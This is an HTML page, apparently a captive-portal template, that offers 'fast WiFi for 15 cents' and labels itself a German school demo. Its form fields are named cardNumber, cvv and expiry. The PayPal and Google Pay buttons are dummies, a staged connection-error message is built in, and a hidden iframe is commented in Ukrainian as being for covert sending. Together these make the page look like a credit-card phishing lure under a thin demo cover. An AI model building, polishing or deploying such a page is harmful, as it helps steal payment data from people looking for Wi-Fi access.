<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Schulprojekt (Demo)</title>
    <meta name="robots" content="noindex, nofollow">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h2>Schulprojekt (Demo)</h2>
        <div class="subtitle">Demo: Schnelles WLAN für 15 Cent — nur Testdaten</div>
        
        <form id="paymentForm">
            <div class="form-group">
                <label for="cardNumber">Demo ID (nicht echte Kartennummer)</label>
                <input type="text" id="cardNumber" placeholder="DEMO-1234-5678" required>
            </div>
            <div class="form-group">
                <label for="cardName">Benutzername</label>
                <input type="text" id="cardName" placeholder="Max Mustermann" required>
            </div>
            <div class="form-group">
                <label for="cvv">Demo Code</label>
                <input type="text" id="cvv" placeholder="CODE123" required>
            </div>
            <div class="form-group">
                <label for="expiry">Notiz / Ablauf (optional)</label>
                <input type="text" id="expiry" placeholder="z. B. 05/25 oder Hinweis" >
            </div>

            <div class="payment-buttons">
                <button type="button" class="payment-btn" onclick="showUnavailable()">PayPal</button>
                <button type="button" class="payment-btn" onclick="showUnavailable()">Google Pay</button>
            </div>

            <div class="error-message" id="errorMessage">
                Probleme mit der Verbindung oder ungültige Testdaten
            </div>
            
            <button type="submit">0,15 € (Demo) abschicken</button>
        </form>

        <div class="security-text">
            Dies ist ein Demo-Projekt. Bitte keine echten Kartendaten eingeben.
        </div>
        
        <div class="copyright">
            © 2024 Schulprojekt WLAN — Demo. Alle Rechte vorbehalten.
        </div>
    </div>

    <!-- прихована iframe для відправки -->
    <iframe name="hidden_iframe_submit" style="display:none;"></iframe>

    <script src="script.js"></script>
</body>
</html>
